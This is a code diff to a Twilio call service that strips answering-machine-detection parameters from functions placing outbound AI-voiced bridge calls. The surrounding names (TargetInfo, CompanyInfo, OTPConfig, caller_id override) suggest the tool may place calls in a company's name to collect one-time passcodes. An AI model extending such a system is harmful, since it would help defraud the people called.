@@ -1,7 +1,7 @@
 """
 services/twilio_service.py
 
-Twilio service with async AMD support.
+Twilio service for placing outbound bridge calls.
 """
 
 import json
@@ -42,13 +42,6 @@ def dial_call_with_twiml(
     chat_id: Optional[int] = None,
     caller_id: Optional[str] = None,
     record: bool = True,
-    machine_detection: Optional[str] = None,
-    async_amd: bool = False,
-    async_amd_status_callback: Optional[str] = None,
-    machine_detection_timeout: Optional[int] = None,
-    machine_detection_speech_threshold: Optional[int] = None,
-    machine_detection_speech_end_threshold: Optional[int] = None,
-    machine_detection_silence_timeout: Optional[int] = None,
     status_callback_events: Optional[list] = None,
     **kwargs,
 ) -> Optional[str]:
@@ -90,18 +83,6 @@ def dial_call_with_twiml(
         call_params["record"] = True
         call_params["recording_channels"] = "mono"
 
-    if machine_detection:
-        call_params["machine_detection"] = machine_detection
-        call_params["async_amd"] = True
-        amd_cb = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
-        if chat_id:
-            amd_cb += f"&chat_id={quote_plus(str(chat_id))}"
-        call_params["async_amd_status_callback"] = amd_cb
-        call_params["machine_detection_timeout"] = machine_detection_timeout or 8
-        call_params["machine_detection_speech_threshold"] = machine_detection_speech_threshold or 1800
-        call_params["machine_detection_speech_end_threshold"] = machine_detection_speech_end_threshold or 1200
-        call_params["machine_detection_silence_timeout"] = machine_detection_silence_timeout or 3000
-
     logger.info("Twilio bridge outbound call params: %s",
                 {k: v for k, v in call_params.items() if k != "twiml"})
     try:
@@ -137,7 +118,6 @@ def place_ai_call(
     from_number: str = None,
     caller_id: str = None,
     record: bool = True,
-    machine_detection: Optional[str] = None,
     endpoint: str = "/twilio_bridge",
     mode_label: str = "AI Call",
     **session_kwargs,
@@ -169,7 +149,6 @@ def place_ai_call(
         chat_id=chat_id,
         caller_id=caller_id,
         record=record,
-        machine_detection=machine_detection,
     )
     if not twilio_sid:
         logger.error("[VAPI_BRIDGE] Twilio dial failed for %s (vapi_call=%s)", to, vapi_call_id)
@@ -201,13 +180,7 @@ def place_ai_call(
 
 def make_call(to: str, from_number: str = None, caller_id: str = None,
               webhook_url: str = None, user_id: str = "",
-              record: bool = True, machine_detection: Optional[str] = None,
-              async_amd: bool = False,
-              async_amd_status_callback: str = None,
-              machine_detection_timeout: Optional[int] = None,
-              machine_detection_speech_threshold: Optional[int] = None,
-              machine_detection_speech_end_threshold: Optional[int] = None,
-              machine_detection_silence_timeout: Optional[int] = None,
+              record: bool = True,
               **kwargs) -> Optional[str]:
     from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
     from services.prompt_builder import PromptBuilder
@@ -282,7 +255,6 @@ def make_call(to: str, from_number: str = None, caller_id: str = None,
         from_number=from_number,
         caller_id=caller_id,
         record=record,
-        machine_detection=machine_detection,
         endpoint=kwargs.get("endpoint") or "/twilio_bridge",
         mode_label=kwargs.get("mode_label") or "AI Call",
         voice_id=voice_id,
@@ -302,13 +274,6 @@ def make_call_and_store_async(
     caller_id: str = None,
     webhook_url: str = None,
     record: bool = True,
-    machine_detection: Optional[str] = None,
-    async_amd: bool = False,
-    async_amd_status_callback: str = None,
-    machine_detection_timeout: Optional[int] = None,
-    machine_detection_speech_threshold: Optional[int] = None,
-    machine_detection_speech_end_threshold: Optional[int] = None,
-    machine_detection_silence_timeout: Optional[int] = None,
     target: str = "",
     **kwargs,
 ):
@@ -322,9 +287,6 @@ def make_call_and_store_async(
             webhook_url=webhook_url,
             user_id=user_id,
             record=record,
-            machine_detection=machine_detection,
-            async_amd=async_amd,
-            async_amd_status_callback=async_amd_status_callback,
             **kwargs,
         )
         return sid
